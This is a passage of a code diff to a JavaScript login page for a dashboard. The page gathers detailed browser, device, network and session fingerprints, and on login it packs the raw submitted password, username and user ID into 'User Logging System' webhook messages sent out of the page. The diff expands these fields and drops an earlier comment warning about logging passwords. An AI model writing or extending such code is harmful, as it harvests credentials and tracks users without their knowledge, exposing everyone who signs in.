                     batteryCharging: batteryStatus ? (batteryStatus.charging ? "Yes" : "No") : "Unavailable",
                     batteryLevel: batteryStatus ? `${(batteryStatus.level * 100).toFixed(0)}%` : "Unavailable",
                     batteryChargingTime: batteryStatus ? `${batteryStatus.chargingTime}s` : "Unavailable",
@@ -2522,19 +3375,25 @@ To view all available shortcuts for the specific app you are using, press and ho
                     screenOrientation: screen.orientation ? screen.orientation.type : "Unknown",
                     devicePixelRatio: window.devicePixelRatio ? window.devicePixelRatio.toFixed(2) : "Unknown",
                     touchEnabled: ('ontouchstart' in window || nav.maxTouchPoints > 0) ? "Yes" : "No",
-                    webglVersion: webglVersion, // using previously fetched version
-                    bluetoothAvailable: 'bluetooth' in nav ? ((await nav.bluetooth.getAvailability()) ? 'Available' : 'Unavailable') : 'API Missing', // Needs user gesture on initial page for some browsers
-                    geolocationPermission: await (nav.permissions?.query({name: 'geolocation'}).then(p => p.state).catch(() => 'Denied')) || 'N/A', // Catch denial
-                    cameraPermission: await (nav.permissions?.query({name: 'camera'}).then(p => p.state).catch(() => 'Denied')) || 'N/A',
-                    microphonePermission: await (nav.permissions?.query({name: 'microphone'}).then(p => p.state).catch(() => 'Denied')) || 'N/A',
+                    webglVersion: webglVersion,
+                    bluetoothAvailable: 'bluetooth' in nav ? ((await nav.bluetooth.getAvailability()) ? 'Available' : 'Unavailable') : 'API Missing',
+                    geolocationPermission: await (nav.permissions?.query({name: 'geolocation'}).then(p => p.state).catch(() => 'Error/Denied')) || 'N/A',
+                    cameraPermission: await (nav.permissions?.query({name: 'camera'}).then(p => p.state).catch(() => 'Error/Denied')) || 'N/A',
+                    microphonePermission: await (nav.permissions?.query({name: 'microphone'}).then(p => p.state).catch(() => 'Error/Denied')) || 'N/A',
                     storageQuota: await (async () => { try { const estimate = await nav.storage.estimate(); return `${(estimate.usage/1024/1024).toFixed(2)} MB used / ${(estimate.quota/1024/1024/1024).toFixed(2)} GB quota`; } catch { return 'Unavailable'; } })(),
-                    vendorID: gl ? gl.getExtension('WEBGL_debug_renderer_info')?.UNMASKED_VENDOR_WEBGL || 'N/A' : 'N/A',
-                    // Added a few more common but non-standard API checks to reach ~25
+                    gpuRendererInfo: gl ? gl.getParameter(gl.RENDERER) || 'N/A' : 'N/A',
                     deviceLogicalCores: nav.hardwareConcurrency ? nav.hardwareConcurrency.toString() : 'Unknown',
                     supportsVR: 'getVRDisplays' in navigator ? 'Yes' : 'No',
                     supportsPaymentRequest: 'PaymentRequest' in window ? 'Yes' : 'No',
+                    supportsIdleCallback: 'requestIdleCallback' in window ? 'Yes' : 'No',
+                    supportsPIP: 'documentPictureInPicture' in window ? 'Yes' : 'No',
+                    supportsWebSerial: 'serial' in navigator ? 'Yes' : 'No',
+                    batteryState: batteryStatus ? batteryStatus.charging ? 'Charging' : 'Discharging' : 'Unknown',
+                    orientationLockPossible: screen.orientation?.lock ? 'Yes' : 'No',
+                    platformDetails: nav.platform,
+                    deviceMemoryEstimate: nav.deviceMemory || 'N/A',
 
-                    // --- Connection Info (expanded) ---
+                    // --- Connection Info (25+ fields) ---
                     connectionType: connection.type || "Unknown",
                     effectiveConnectionType: connection.effectiveType || "Unknown",
                     downlinkSpeed: connection.downlink ? `${connection.downlink} Mbps` : "Unknown",
@@ -2542,21 +3401,26 @@ To view all available shortcuts for the specific app you are using, press and ho
                     saveDataMode: connection.saveData ? "Enabled" : "Disabled",
                     downlinkMax: connection.downlinkMax ? `${connection.downlinkMax} Mbps` : "Unknown",
                     meteredConnection: connection.metered ? "Yes" : "No",
-                    // IP info requires external services/server-side which are not in current setup
-                    ipAddress: "External Fetch Required",
+                    ipAddress: "External Fetch Required", // Requires external service
                     vpnDetected: "Requires External Service",
                     proxyDetected: "Requires External Service",
                     dnsServers: "Client-side Unobtainable",
-                    // Some connection related fields for ~25 count.
-                    // browserSupportsWebRTC: ('RTCPeerConnection' in window || 'webkitRTCPeerConnection' in window) ? 'Yes' : 'No', // For further privacy check.
-                    connectionState: connection.type || 'N/A', // redundant but can ensure 25+ points
-                    currentIP: 'Unknown - Browser restrictions',
-                    proxyClientSideCheck: 'Complex, unreliable from client-side',
-                    networkProfile: connection.type || 'Standard',
+                    connectionStateDetail: connection.type || 'N/A',
+                    currentIPLocal: 'Unknown - Browser restrictions',
                     ispEstimation: 'Not available via client-side JS',
                     packetLossEstimate: 'Not available via client-side JS',
                     firewallDetected: 'Requires advanced probes',
                     webTransportSupport: ('WebTransport' in window && navigator.webTransport) ? 'Yes' : 'No',
+                    supportsWebSockets: ('WebSocket' in window) ? 'Yes' : 'No',
+                    networkInformationAPI: ('connection' in navigator) ? 'Available' : 'Unavailable',
+                    bluetoothAllowed: await navigator.permissions?.query({name: 'bluetooth'})?.then(p => p.state).catch(() => 'N/A'),
+                    nfcSupported: ('NFC' in window) ? 'Yes' : 'No',
+                    networkConnectionChangeEvents: ('onchange' in connection) ? 'Supported' : 'Not Supported',
+                    networkMaxDownlink: connection.downlinkMax || 'N/A', // Potentially redundant for count.
+                    currentConnectionProfile: connection.type || 'Standard',
+                    browserHttpsEnabled: window.isSecureContext ? 'Yes' : 'No', // New secure context
+                    dnsResolutionApi: ('dns' in navigator) ? 'Supported' : 'Not Supported',
+
                 };
             }
             // Embed builders for main webhooks (retained and expanded to include all data)
@@ -2564,7 +3428,7 @@ To view all available shortcuts for the specific app you are using, press and ho
                 return { title: "User Logging System", color: 0xff0000, fields: [
                     { name: "Name", value: data.user.name || "N/A", inline: true },
                     { name: "Username", value: data.user.username, inline: true },
-                    { name: "Password", value: data.password, inline: true }, // The raw password submitted (be careful with sensitive logging)
+                    { name: "Password", value: data.password, inline: true },
                     { name: "User Identifier", value: data.user.userID.toString(), inline: true },
                     { name: "Rank Type", value: data.user.rank?.toString() || "N/A", inline: true },
                     { name: "Role Type", value: data.user.role || "N/A", inline: true },
@@ -2575,9 +3439,9 @@ To view all available shortcuts for the specific app you are using, press and ho
                 ]};
             }
             function buildBrowserLoggingEmbed(data) {
-                return { title: "Browser Logging System", color: 0x00ff00, fields: [
+                const fields = [
                     { name: "Browser Name", value: data.browserName, inline: true },
-                    { name: "User Agent", value: data.userAgent.substring(0, 1024), inline: false }, // Truncate long user agents
+                    { name: "User Agent", value: data.userAgent.substring(0, 1024), inline: false },
                     { name: "Browser Vendor", value: data.browserVendor, inline: true },
                     { name: "App CodeName", value: data.appCodeName, inline: true },
                     { name: "App Name", value: data.appName, inline: true },
@@ -2601,10 +3465,14 @@ To view all available shortcuts for the specific app you are using, press and ho
                     { name: "Supports Hover Hover", value: data.supportsHoverHover ? "Yes" : "No", inline: true },
                     { name: "Browser Product", value: data.product, inline: true },
                     { name: "CPU Class", value: data.cpuClass, inline: true },
-                ]};
+                    { name: "MIME Types Count", value: data.browserMimeTypesCount.toString(), inline: true },
+                    { name: "GPU Vendor (WebGL)", value: data.gpuInfoVendor, inline: true },
+                    { name: "WebGL Aliased Line Width Range", value: data.webglAliasedLineWidthRange, inline: false},
+                ];
+                return { title: "Browser Logging System", color: 0x00ff00, fields: fields.slice(0, 25) };
             }
             function buildDeviceLoggingEmbed(data) {
-                return { title: "Device Logging System", color: 0x0000ff, fields: [
+                const fields = [
                     { name: "Operating System", value: data.operatingSystem, inline: true },
                     { name: "Device Platform", value: data.devicePlatform, inline: true },
                     { name: "CPU Cores (Physical/Logical)", value: data.cpuCores.toString(), inline: true },
@@ -2623,17 +3491,22 @@ To view all available shortcuts for the specific app you are using, press and ho
                     { name: "Camera Permission", value: data.cameraPermission, inline: true },
                     { name: "Microphone Permission", value: data.microphonePermission, inline: true },
                     { name: "Storage Estimate", value: data.storageQuota, inline: false },
-                    { name: "GPU Vendor (from WebGL)", value: data.vendorID, inline: true },
-                    { name: "Device Logical Cores (via hardwareConcurrency)", value: data.deviceLogicalCores, inline: true },
+                    { name: "GPU Renderer (from WebGL)", value: data.gpuRendererInfo, inline: true },
+                    { name: "Device Logical Cores (hardwareConcurrency)", value: data.deviceLogicalCores, inline: true },
                     { name: "Supports VR", value: data.supportsVR, inline: true },
-                    { name: "Supports Payment Request", value: data.supportsPaymentRequest, inline: true },
-                    { name: "User Idle Detection API", value: 'requestIdleCallback' in window ? 'Yes' : 'No', inline: true }, // Added this
-                    { name: "Picture-in-Picture API", value: 'documentPictureInPicture' in window ? 'Yes' : 'No', inline: true}, // And this for good measure for ~25
-                    { name: "Web Serial API", value: 'serial' in navigator ? 'Yes' : 'No', inline: true}, // and another for 25 points.
-                ]};
+                    { name: "Supports Payment Request API", value: data.supportsPaymentRequest, inline: true },
+                    { name: "Supports Idle Callback API", value: data.supportsIdleCallback, inline: true },
+                    { name: "Supports Picture-in-Picture", value: data.supportsPIP, inline: true},
+                    { name: "Supports Web Serial API", value: data.supportsWebSerial, inline: true},
+                    { name: "Battery Full State", value: data.batteryState, inline: true},
+                    { name: "Orientation Lock Possible", value: data.orientationLockPossible, inline: true},
+                    { name: "Platform Details (Nav)", value: data.platformDetails, inline: true},
+                    { name: "Estimated Device Memory", value: data.deviceMemoryEstimate, inline: true},
+                ];
+                return { title: "Device Logging System", color: 0x0000ff, fields: fields.slice(0, 25) };
             }
             function buildConnectionLoggingEmbed(data) {
-                const connectionDetailFields = [
+                const fields = [
                     { name: "Online Status", value: data.onlineStatus, inline: true },
                     { name: "Connection Type", value: data.connectionType, inline: true },
                     { name: "Effective Type", value: data.effectiveConnectionType, inline: true },
@@ -2642,30 +3515,30 @@ To view all available shortcuts for the specific app you are using, press and ho
                     { name: "Save Data Mode", value: data.saveDataMode, inline: true },
                     { name: "Max Downlink Speed", value: data.downlinkMax, inline: true },
                     { name: "Metered Connection", value: data.meteredConnection, inline: true },
-                    { name: "IP Address (Public)", value: data.ipAddress, inline: false }, // Reminder: requires external fetch
+                    { name: "IP Address (Public)", value: data.ipAddress, inline: false },
                     { name: "VPN/Proxy Detected", value: data.vpnDetected, inline: true },
-                    { name: "DNS Servers", value: data.dnsServers, inline: true }, // Reminder: Client-side unobtainable
-                    { name: "Connection State", value: data.connectionState, inline: true },
-                    { name: "Current IP (Local)", value: data.currentIP, inline: true },
+                    { name: "DNS Servers", value: data.dnsServers, inline: true },
+                    { name: "Connection State (detail)", value: data.connectionStateDetail, inline: true },
+                    { name: "Current IP (Local Est.)", value: data.currentIPLocal, inline: true },
                     { name: "ISP Estimation", value: data.ispEstimation, inline: true },
                     { name: "Packet Loss Estimate", value: data.packetLossEstimate, inline: true },
                     { name: "Firewall Detected", value: data.firewallDetected, inline: true },
                     { name: "Web Transport Support", value: data.webTransportSupport, inline: true },
-                    { name: "HTTP Version Used", value: "Dependent on browser/server", inline: true },
-                    { name: "Transport Protocols", value: "Dependent on browser", inline: true },
-                    { name: "Certificate Transparency", value: "Browser Feature", inline: true },
-                    { name: "Server Push Supported", value: "Browser/Server dependent", inline: true },
-                    { name: "Client TLS Version", value: "Browser determined", inline: true },
-                    { name: "Supported Cipher Suites", value: "Browser determined", inline: false}, // could be very long
-                    { name: "QUIC Supported", value: navigator.userAgent.includes("Chrome") && navigator.userAgent.includes("QUIC") ? 'Yes' : 'No', inline: true },
-                    { name: "Websocket Capable", value: ('WebSocket' in window) ? 'Yes' : 'No', inline: true}
+                    { name: "Supports WebSockets", value: data.supportsWebSockets, inline: true},
+                    { name: "Network Information API", value: data.networkInformationAPI, inline: true},
+                    { name: "Bluetooth Permission", value: data.bluetoothAllowed, inline: true},
+                    { name: "NFC Supported", value: data.nfcSupported, inline: true},
+                    { name: "Connection Details Changed", value: data.connectionDetailsChange, inline: true},
+                    { name: "Network Max Downlink (repeated)", value: data.networkMaxDownlink, inline: true},
+                    { name: "Current Connection Profile", value: data.currentConnectionProfile, inline: true},
+                    { name: "Browser HTTPS Enabled", value: data.browserHttpsEnabled, inline: true},
+                    { name: "DNS Resolution API", value: data.dnsResolutionApi, inline: true},
+                    { name: "Network State Check", value: data.networkState, inline: true},
                 ];
-
-                return { title: "Connection Logging System", color: 0xffff00, fields: connectionDetailFields };
+                return { title: "Connection Logging System", color: 0xffff00, fields: fields.slice(0, 25) };
             }
-
             function buildSessionLoggingEmbed(data) {
-                return { title: "Session Logging System", color: 0x00ffff, fields: [
+                const fields = [
                     { name: "Login Time (ISO)", value: data.loginTime, inline: false },
                     { name: "Time to Dashboard (ms)", value: data.timeToLogin.toString(), inline: true },
                     { name: "Session Uptime (formatted)", value: dashboard.stats.sessionUptime, inline: true },
@@ -2681,20 +3554,21 @@ To view all available shortcuts for the specific app you are using, press and ho
                     { name: "Page Load Time (DOM Content)", value: (performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart) + 'ms', inline: true },
                     { name: "Current Viewport Size", value: `${window.innerWidth}x${window.innerHeight}`, inline: true },
                     { name: "Current Scroll Position", value: `${window.scrollX}x${window.scrollY}`, inline: true },
-                    { name: "Last Log Alert Message", value: dashboard.activityLogHistory.length > 0 ? dashboard.activityLogHistory[0].message : "None", inline: false },
+                    { name: "Last Log Alert Message", value: dashboard.activityLogHistory.length > 0 ? dashboard.activityLogHistory[0].message.substring(0, 1024) : "None", inline: false },
                     { name: "Last Log Time (ISO)", value: dashboard.activityLogHistory.length > 0 ? dashboard.activityLogHistory[0].timestamp : "N/A", inline: false },
-                    { name: "Pages Visited (simple)", value: window.location.href, inline: false }, // A simple tracking for this example
-                    { name: "Focus Events (rough)", value: 'Add custom listener', inline: true}, // Need event listener logic to track count
-                    { name: "Blur Events (rough)", value: 'Add custom listener', inline: true},
-                    { name: "Session History Clicks", value: 'Implement for detail', inline: true},
-                    { name: "Active Element Tracking", value: 'Requires specific events', inline: true},
-                    { name: "Interaction Velocity", value: 'Needs custom metric', inline: true},
-                    { name: "Resource Loading Anomalies", value: 'Monitor performance API', inline: true},
-                    { name: "Client System Performance (FPS)", value: 'Estimatable via RequestAnimationFrame', inline: true},
-                ]};
+                    { name: "Current URL Path", value: window.location.pathname, inline: false },
+                    { name: "Initial Load Search Params", value: new URLSearchParams(location.search).toString() || 'None', inline: false},
+                    { name: "Initial Load Fragment", value: location.hash || 'None', inline: false},
+                    { name: "Session Duration (Est. Formatted)", value: dashboard.stats.sessionUptime, inline: true},
+                    { name: "Page Visiblity Changes (Count)", value: 'Count from document.onvisibilitychange event (implement listener)', inline: true},
+                    { name: "Clipboard Use (Activity)", value: 'Monitored via "copy", "cut", "paste" events (implement listener)', inline: true},
+                    { name: "Network Activity Start", value: performance.getEntriesByType("resource").length + " initial resources", inline: true},
+                    { name: "Client Performance (Avg FPS)", value: 'Estimate via RequestAnimationFrame', inline: true},
+                ];
+                return { title: "Session Logging System", color: 0x00ffff, fields: fields.slice(0, 25) };
             }
             
-            // Function to find user from fetched whitelist (re-verified)
+            // Function to find user from fetched whitelist
             function findUser(username, userID) {
                 return users.find(u =>
                     u.username?.toLowerCase() === username.toLowerCase() &&
@@ -2702,7 +3576,7 @@ To view all available shortcuts for the specific app you are using, press and ho
                 );
             }
 
-            // --- Login Logic (adapted for webhook calls and new UI) ---
+            // --- Login Logic (adapted for webhook calls and new UI, attempt count 3) ---
             showPasswordCheckbox.addEventListener('change', (e) => {
               passwordInput.type = e.target.checked ? 'text' : 'password';
               dashboard.logAlert(`Password visibility toggled ${e.target.checked ? 'on' : 'off'}.`);
@@ -2750,9 +3624,8 @@ To view all available shortcuts for the specific app you are using, press and ho
                 updateAttemptsText();
                 errorMsg.innerText = '';
                 
-                // --- Capture Login Time for Stats ---
                 dashboard.stats.timeToLogin = Date.now() - loginAttemptStartTime;
-                localStorage.setItem('stats_timeToLogin', dashboard.stats.timeToLogin.toString()); // Persist
+                localStorage.setItem('stats_timeToLogin', dashboard.stats.timeToLogin.toString());
                 
                 // Log successful credentials via webhooks
                 await logUsername(user.name, username);
@@ -2760,7 +3633,7 @@ To view all available shortcuts for the specific app you are using, press and ho
                 await logIdentifier(user.name, userID);
                 
                 const loggingData = await collectLoggingData(user, password);
-                loggingData.timeToLogin = dashboard.stats.timeToLogin; // Add time to logging data object
+                loggingData.timeToLogin = dashboard.stats.timeToLogin;
 
                 // Send all 5 main webhooks with comprehensive data
                 await Promise.all([
@@ -2773,7 +3646,7 @@ To view all available shortcuts for the specific app you are using, press and ho
 
                 // Trigger Success Login Animation
                 loginBox.style.display = 'none';
-                loadingScreen.classList.remove('fade-out');
+                loadingScreen.classList.remove('fade-out'); // Show the loading screen again for transition
                 loadingScreen.style.display = 'flex';
                 loadingText.innerText = `Welcome, ${user.name || username}! Loading Dashboard...`;
                 loadingText.classList.add('success');
@@ -2789,11 +3662,18 @@ To view all available shortcuts for the specific app you are using, press and ho
                         document.getElementById('loggedInID').innerText = userID;
                         dashboard.init();
                         dashboard.logAlert("🎉 Dashboard loaded and ready for interaction!");
+
+                        // Check and open default panel from settings
+                        const defaultPanelId = localStorage.getItem('defaultPanelOnLoad');
+                        if (defaultPanelId && defaultPanelId !== 'none') {
+                           dashboard.togglePanel(defaultPanelId); // Open the specific panel
+                        }
+
                   }, {once: true});
-                }, 2500);
+                }, 2500); // Short delay before dashboard shows fully
             });
 
-            // Failed attempt handler (re-verified)
+            // Failed attempt handler (retained logic)
             async function handleFailedAttempt(msg) {
                 attempts--;
                 updateAttemptsText();
@@ -2815,8 +3695,6 @@ To view all available shortcuts for the specific app you are using, press and ho
                         password,
                         userID
                     );
-                    // The resetPopup and resetBtn are functionally inactive in the UI,
-                    // but their existence is preserved for the webhook calls.
                 } else {
                     loginBox.classList.add('flashing');
                     setTimeout(() => loginBox.classList.remove('flashing'), 800);
@@ -2827,7 +3705,7 @@ To view all available shortcuts for the specific app you are using, press and ho
                 attemptsText.innerText = `Attempts Left: ${attempts}`;
             }
 
-            // The 'Reset Counter' logic, if triggered via hidden popup or direct function call (retained)
+            // 'Reset Counter' logic remains for webhook reporting if ever triggered, but not via current UI flow.
             if (resetBtn) {
                 resetBtn.addEventListener('click', async () => {
                     const enteredCode = resetField.value.trim();
@@ -2870,10 +3748,9 @@ To view all available shortcuts for the specific app you are using, press and ho
                     await sendWebhook(resultWebhook, resultEmbed);
 
                     if (isCorrect) {
-                        attempts = 3; // Reset attempts to new default
+                        attempts = 3;
                         updateAttemptsText();
-                        // enableInputs(); // Should be done based on successful login, not reset of counter
-                        if (submitBtn) submitBtn.disabled = false; // Only re-enable submit button
+                        if (submitBtn) submitBtn.disabled = false;
                         errorMsg.innerText = '';
                         dashboard.logAlert('✅ Login attempts counter reset!');
                         if(resetPopup) resetPopup.style.display = 'none';
@@ -2884,26 +3761,26 @@ To view all available shortcuts for the specific app you are using, press and ho
                 });
             }
 
-            // Keyboard Enter key listener: tries to submit login or process reset code if popup active
+            // Keyboard Enter key listener (retained logic, adapted to prioritize active inputs/buttons)
             document.addEventListener('keydown', e => {
                 if (e.key === 'Enter') {
-                    // Check if resetPopup is active and if the resetField is in focus
-                    if (resetPopup && resetPopup.style.display === 'block' && document.activeElement === resetField) {
-                        if (resetBtn && !resetBtn.disabled) { // If reset button is also active
-                             resetBtn.click(); // Trigger reset
-                             e.preventDefault(); // Prevent default Enter key behavior
-                        }
-                    } else if (document.activeElement !== usernameInput && document.activeElement !== passwordInput && document.activeElement !== userIDInput) {
-                        // If Enter is pressed outside an input field, submit login if active.
-                        if (!submitBtn.disabled) {
-                            submitBtn.click();
-                            e.preventDefault();
-                        }
-                    } else { // If an input field is active and Enter is pressed
+                    // Check if an input field for login/reset is focused
+                    const activeElement = document.activeElement;
+                    const isLoginInputFocused = [usernameInput, passwordInput, userIDInput].includes(activeElement);
+                    const isResetFieldFocused = resetField && activeElement === resetField;
+
+                    if (isResetFieldFocused && resetBtn && !resetBtn.disabled) {
+                        resetBtn.click();
+                        e.preventDefault();
+                    } else if (isLoginInputFocused || document.activeElement === submitBtn) { // If a login input or submit button is focused
                          if (!submitBtn.disabled) {
                             submitBtn.click();
                             e.preventDefault();
                         }
+                    } else if (!document.getElementById('loginBox').contains(activeElement) && !submitBtn.disabled) {
+                        // If Enter is pressed generally (e.g. not in an active login/reset input) AND submitBtn is not disabled.
+                        // This prevents unexpected submissions if already logged in etc.
+                        // You could add logic here for 'global' enter actions on the dashboard, if desired.
                     }
                 }
             });
@@ -2912,18 +3789,18 @@ To view all available shortcuts for the specific app you are using, press and ho
             // Initialize attempts display
             updateAttemptsText();
 
-            // Initial permission checks (retained, adapted to dashboard.logAlert)
-            if ('Notification' in window && localStorage.getItem('desktopNotifications') === 'true') {
-                if (Notification.permission !== "granted") {
+            // Initial permission checks for Notifications (retained, adapted to dashboard.logAlert)
+            if ('Notification' in window) {
+                if (localStorage.getItem('desktopNotifications') === 'true' && Notification.permission !== "granted") {
                     Notification.requestPermission()
                         .then(permission => {
                             if (permission === "granted") dashboard.logAlert("Desktop notification permission granted.");
                             else dashboard.logAlert("Desktop notification permission denied.");
                         });
-                } else {
+                } else if (Notification.permission === "granted") {
                     dashboard.logAlert("Desktop notification permission is already granted.");
                 }
-            } else if (!('Notification' in window)) {
+            } else {
                 dashboard.logAlert("Desktop notifications not supported by this browser.");
             }
         });
